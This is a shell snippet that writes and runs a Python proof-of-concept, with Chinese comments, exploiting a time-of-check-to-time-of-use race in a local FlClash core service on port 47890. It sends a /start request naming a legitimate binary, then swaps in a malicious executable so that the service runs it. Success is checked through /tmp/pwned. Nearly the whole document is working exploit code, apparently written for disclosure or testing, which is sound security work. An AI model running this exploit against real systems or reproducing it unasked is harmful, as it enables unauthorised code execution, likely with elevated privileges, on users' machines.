cp FlClashCore FlClashCore_
cat << EOF > a.py
import requests
import threading
import os
import time
import shutil

# --- 配置 ---
# 易受攻击服务的URL
URL = "http://127.0.0.1:47890/start"

# 将被验证然后替换的目标文件路径
TARGET_PATH = "/tmp/FlClashCore_"

# 恶意可执行文件的源路径（将替换合法文件）
MALICIOUS_EXECUTABLE_SOURCE = "/tmp/a.out"

# 传递给恶意可执行文件的参数
# 本例中/tmp/a.out脚本不使用参数，但仍保留此设置
ATTACK_ARG = "pwned"

def send_start_request():
    """
    线程函数：发送启动请求
    触发服务端操作（哈希计算）
    """
    payload = {
        "path": TARGET_PATH,
        "arg": ATTACK_ARG
    }
    try:
        print("[+] 攻击线程：正在发送POST请求到/start...")
        # 设置超时防止服务端挂起时无限等待
        response = requests.post(URL, json=payload, timeout=5)
        print(f"[+] 攻击线程：服务器响应状态码: {response.status_code}")
        print(f"[+] 攻击线程：服务器返回内容: {response.text}")
    except requests.exceptions.RequestException as e:
        # 攻击成功时预期会出现此异常（新进程执行后不会返回标准HTTP响应）
        print(f"[-] 攻击线程：请求按预期失败或出现错误: {e}")

def race_the_check():
    """
    主函数：执行条件竞争攻击
    """
    # 创建临时副本保证PoC可重复运行（避免原始/tmp/a.out被重命名覆盖）
    temp_malicious_path = "/tmp/a.out.tmp"
    shutil.copy(MALICIOUS_EXECUTABLE_SOURCE, temp_malicious_path)
    os.chmod(temp_malicious_path, 0o755)  # 确保可执行权限

    # 创建并启动HTTP请求线程
    request_thread = threading.Thread(target=send_start_request)
    
    print("[*] 启动条件竞争攻击(TOCTOU)...")
    request_thread.start()

    # 关键延迟：调整此值使服务端开始读取文件后再进行替换
    # 通常0.001-0.05秒效果最佳
    time.sleep(0.01)

    print(f"[*] 主线程：正在替换文件'{TARGET_PATH}'！")
    
    try:
        # 原子重命名操作：用恶意文件替换合法文件
        # 这是TOCTOU攻击的核心
        os.rename(temp_malicious_path, TARGET_PATH)
        print(f"[+] 主线程：文件替换成功")
    except OSError as e:
        print(f"[-] 主线程：文件替换失败: {e}")
        request_thread.join()
        return

    # 等待请求线程结束
    request_thread.join()

    print("\n[!] 攻击完成")
    print("[?] 请检查文件'/tmp/pwned'是否存在以验证攻击结果")
    print("    执行命令: cat /tmp/pwned")
    print(f"\n[*] 注意：再次测试前请恢复'{TARGET_PATH}'的原始内容")


if __name__ == "__main__":
    # 检查必要文件是否存在
    if not os.path.exists(TARGET_PATH) or not os.path.exists(MALICIOUS_EXECUTABLE_SOURCE):
        print("[-] 错误：请确保存在'/tmp/FlClashCore_'(合法文件)和'/tmp/a.out'(恶意文件)")
        print("    使用教程中的命令创建测试文件")
    else:
        race_the_check()
EOF
python3 a.py